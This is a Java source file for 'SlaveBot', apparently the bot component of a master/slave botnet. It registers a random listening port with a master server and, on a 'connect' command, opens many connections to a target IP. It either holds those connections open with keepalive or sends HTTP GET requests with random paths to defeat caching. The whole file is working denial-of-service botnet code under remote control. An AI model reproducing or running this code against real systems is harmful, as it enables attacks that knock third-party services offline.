
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

public class SlaveBot {
	private static int PORT = (49152 + (int) (Math.random() * (65535 - 49152)));
	private static List<Socket> sockets = new ArrayList<>();
	
	
	public static void main(String[] args) {
		String serverIp = "";
		int serverPort = 0;
		if (args.length != 4) {
			System.out.println("Incorrect number of args");
			return;
		}

		for (int i = 0; i < args.length; i++) {
			switch (args[i]) {
			case "-h":
				serverIp = args[i + 1];
				break;
			case "-p":
				serverPort = Integer.parseInt(args[i + 1]);
				break;
			}
		}

		// masterSocket is connected to MasterBot
		Socket masterSocket = null;
		try {
			masterSocket = new Socket(serverIp, serverPort);
			PrintWriter writer = new PrintWriter(masterSocket.getOutputStream(), true);
			writer.println(PORT);
			System.out.println("Sending my port to master: " + PORT);
		} catch (IOException e) {
			System.exit(-1);
		} finally {
			if (masterSocket != null) {
				try {
					masterSocket.close();
				} catch (IOException e) {
					System.exit(-1);
				}
			}
		}

		try {
			// Listen to the slave port.
			ServerSocket serverSocket = new ServerSocket(PORT, 10_000);

			while (true) {
				Socket slaveSocket = serverSocket.accept();
				BufferedReader in = new BufferedReader(new InputStreamReader(slaveSocket.getInputStream()));
				String[] cmds = in.readLine().trim().split(" ");
				assert cmds.length > 3;
				switch (cmds[0]) {
				case "disconnect":
					assert cmds.length == 1;
					System.out.println("disconnect signal received...");
					for (Socket connSocket : sockets) {
						if (!connSocket.isClosed()) {
							connSocket.close();
						}
						sockets.clear();
					}
					break;
				case "connect":
					assert cmds.length == 6;
					System.out.println("connect signal received with cmd: " + String.join(" ", cmds));
					String targetIp = cmds[1];
					int targetPort = Integer.parseInt(cmds[2]);

					int connections = Integer.parseInt(cmds[3].substring("conn=".length()));
					boolean keepalive = cmds[4].substring("keepalive=".length()).equals("1");
					String path = cmds[5].substring("path=".length());

					for (int i = 0; i < connections; i++) {
						createConnection(targetIp, targetPort, keepalive, path);
					}
				}

				if (cmds[0].equals("quit")) {
					break;
				}
			}
			serverSocket.close();
		} catch (IOException e) {
			System.exit(-1);
		}
	}

	private static void createConnection(String targetIp, int targetPort, boolean keepalive, String path)
			throws UnknownHostException, IOException, SocketException {
		Socket connSocket = new Socket(targetIp, targetPort);
		if (keepalive) {
			connSocket.setKeepAlive(true);
			sockets.add(connSocket);
			return;
		}
		// if slave creates random string
		path += createRandomString(10);
		System.out.println("The random string : " + path);
		
		
		PrintWriter writer = new PrintWriter(connSocket.getOutputStream(), true);
		writer.println("GET /" + path + " HTTP/1.1");
		writer.println("Host: " + targetIp);
		writer.println("Connection: close");
		writer.println();
		writer.flush();

		BufferedReader reader = new BufferedReader(new InputStreamReader(connSocket.getInputStream()));
		String response = "";
		System.out.println("Getting response from server: ");
		while ((response = reader.readLine()) != null) {
			System.out.println(response);
		}
		System.out.println("Sent a msg to target...");
		connSocket.close();
	}
	
	private static String createRandomString(int maxLen) {
		int len = new Random().nextInt(maxLen) + 1;
		StringBuffer str = new StringBuffer();
		for (int j = 0; j < len; j++) {
			str.append( new String(Character.toChars(new Random().nextInt(94) + 33)));
		}
		return str.toString();
	}

}
